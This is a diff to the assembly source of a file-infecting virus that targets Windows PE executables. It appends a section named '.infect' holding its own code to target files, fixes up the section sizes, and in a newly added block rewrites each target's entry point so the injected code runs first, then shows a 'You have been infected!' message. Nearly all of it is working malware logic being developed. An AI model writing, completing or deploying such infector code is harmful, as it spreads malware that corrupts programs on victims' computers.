@@ -26,7 +26,7 @@ inject SEGMENT read write execute
 	strCaption db 'Notice', 0
     strContent db 'You have been infected!', 0
     
-    ishName db '.infect', 0 ; 8 bytes in length
+    ishName db '.infect', 0 ; MUST be 8 bytes in length
     ishVirtualSize dd 0
     ishVirtualAddress dd 0
     ishSizeOfRawData dd 0
@@ -57,7 +57,7 @@ start:
     imul eax, regSz
     sub esp, eax
     
-    mov edx, [ebp] ; selfEntry + 1 + 4
+    mov edx, [ebp] ; selfEntry + 1 + 4 (call here is 5 bytes long)
     sub edx, 5 ; eax = selfEntry
     toStack selfEntry, edx
     
@@ -298,11 +298,12 @@ start:
 			invoke fromStack(fread), fromStack(selfHand), daccess(temp320B), ecx, daccess(tempDword2), 0
 			invoke fromStack(fwrite), fromStack(tgHand), daccess(temp320B), ecx, daccess(tempDword2), 0
 			
+		
+			
 		; Register VirtualSize & SizeOfRawData
-		invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR
-		mov ebx, eax
-		sub ebx, vaccess(ishPointerToRawData)
-		mov daccess(ishVirtualSize), ebx	
+		invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_CUR ; Obtain current position
+		sub eax, vaccess(ishPointerToRawData)
+		mov daccess(ishVirtualSize), eax	
 		closest	eax, fromStack(FileAlignment)
 		mov daccess(ishSizeOfRawData), eax
 
@@ -330,6 +331,14 @@ start:
 		mov daccess(tempDword), eax
 		invoke fromStack(fseek), fromStack(tgHand), ebx, 0, SEEK_SET
 		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 4, daccess(tempDword2), 0
+		
+		; Edit AddressOfEntryPoint
+		sub ebx, 56 - 16
+		mov edx, fromStack(ishVirtualAddress)
+		add edx, entrySectionOffset
+		mov daccess(tempDword), edx
+		invoke fromStack(fseek), fromStack(tgHand), ebx, 0, SEEK_SET
+		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 4, daccess(tempDword2), 0
 
 	nextFile:
 		invoke fromStack(fclose), fromStack(tgHand)
@@ -350,9 +359,7 @@ start:
     call fromStack(msgbox)
     
     to_exit:
-    mov eax, stack_reserved
-    imul eax, regSz
-    add esp, regSz
+    mov esp, ebp
     jmp exit
     
 inject ENDS
